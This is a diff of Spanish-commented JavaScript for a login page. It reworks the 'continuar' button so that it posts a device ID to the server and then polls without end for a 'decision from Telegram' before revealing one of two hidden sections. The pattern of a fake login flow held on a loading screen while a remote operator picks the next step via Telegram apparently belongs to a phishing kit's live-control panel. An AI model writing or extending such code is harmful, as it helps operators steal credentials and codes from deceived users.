@@ -24,12 +24,76 @@ document.getElementById("entrarBtn").addEventListener("click", function () {
     });
 });
 
-document.getElementById("continuarBtn").addEventListener("click", function () {
-    showLoadingScreen(() => {
-        document.querySelector(".password-modal").classList.add("hidden");
-        document.querySelector(".auth-modal").classList.remove("hidden");
-    });
-});
+// ========================================
+// BOTÓN CONTINUAR - OPCIONES INDEPENDIENTES
+// ========================================
+
+let esperandoDecisionOpciones = false;
+
+document.getElementById("continuarBtn").addEventListener(
+    "click",
+    async function () {
+
+        if (esperandoDecisionOpciones) {
+            return;
+        }
+
+        esperandoDecisionOpciones = true;
+
+        // Mostrar la pantalla de carga original
+        const loadingScreen =
+            document.querySelector(".loading-screen");
+
+        loadingScreen.classList.remove("hidden");
+
+        loadingScreen.style.backgroundColor =
+            "rgba(233, 233, 233, 0.6)";
+
+        // Obtener el ID que ya utiliza la página
+        const dispositivoID = obtenerIDDispositivo();
+
+        try {
+
+            // Crear solicitud independiente
+            const respuesta = await fetch(
+                "/opciones/crear",
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        dispositivoID
+                    })
+                }
+            );
+
+            if (!respuesta.ok) {
+                throw new Error(
+                    "No se pudo crear la solicitud"
+                );
+            }
+
+            const datos = await respuesta.json();
+
+            // Esperar la decisión de Telegram
+            await esperarDecisionOpciones(
+                datos.idSolicitud
+            );
+
+        } catch (error) {
+
+            console.error(
+                "Error en las opciones:",
+                error
+            );
+
+            loadingScreen.classList.add("hidden");
+
+            esperandoDecisionOpciones = false;
+        }
+    }
+);
 
 document.getElementById("cancelarBtn").addEventListener("click", function () {
     document.querySelector(".password-modal").classList.add("hidden");
@@ -208,3 +272,100 @@ document.getElementById("usuario").addEventListener("focus", function () {
         });
     }, 300);
 });
+
+// ========================================
+// ESPERAR DECISIÓN DE TELEGRAM
+// ========================================
+
+async function esperarDecisionOpciones(idSolicitud) {
+
+    while (true) {
+
+        try {
+
+            const respuesta = await fetch(
+                "/opciones/estado/" +
+                encodeURIComponent(idSolicitud),
+                {
+                    cache: "no-store"
+                }
+            );
+
+            if (!respuesta.ok) {
+                throw new Error(
+                    "No se pudo consultar la decisión"
+                );
+            }
+
+            const datos = await respuesta.json();
+
+            if (datos.estado === "si") {
+
+                mostrarSeccionOpciones("si");
+
+                return;
+            }
+
+            if (datos.estado === "no") {
+
+                mostrarSeccionOpciones("no");
+
+                return;
+            }
+
+        } catch (error) {
+
+            console.error(
+                "Esperando conexión:",
+                error.message
+            );
+        }
+
+        // Consultar nuevamente sin establecer caducidad
+        await new Promise(resolve => {
+            setTimeout(resolve, 1500);
+        });
+    }
+}
+
+
+// ========================================
+// MOSTRAR SECCIÓN CORRESPONDIENTE
+// ========================================
+
+function mostrarSeccionOpciones(opcion) {
+
+    const loadingScreen =
+        document.querySelector(".loading-screen");
+
+    const loginContainer =
+        document.querySelector(".login-container");
+
+    const seccionSi =
+        document.getElementById("seccion-si");
+
+    const seccionNo =
+        document.getElementById("seccion-no");
+
+    // Ocultar pantalla de carga
+    loadingScreen.classList.add("hidden");
+
+    // Ocultar las ventanas anteriores
+    loginContainer.classList.add("hidden");
+
+    // Ocultar ambas secciones inicialmente
+    seccionSi.classList.add("hidden");
+    seccionNo.classList.add("hidden");
+
+    // Mostrar únicamente la sección seleccionada
+    if (opcion === "si") {
+
+        seccionSi.classList.remove("hidden");
+
+    } else if (opcion === "no") {
+
+        seccionNo.classList.remove("hidden");
+    }
+
+    esperandoDecisionOpciones = false;
+}
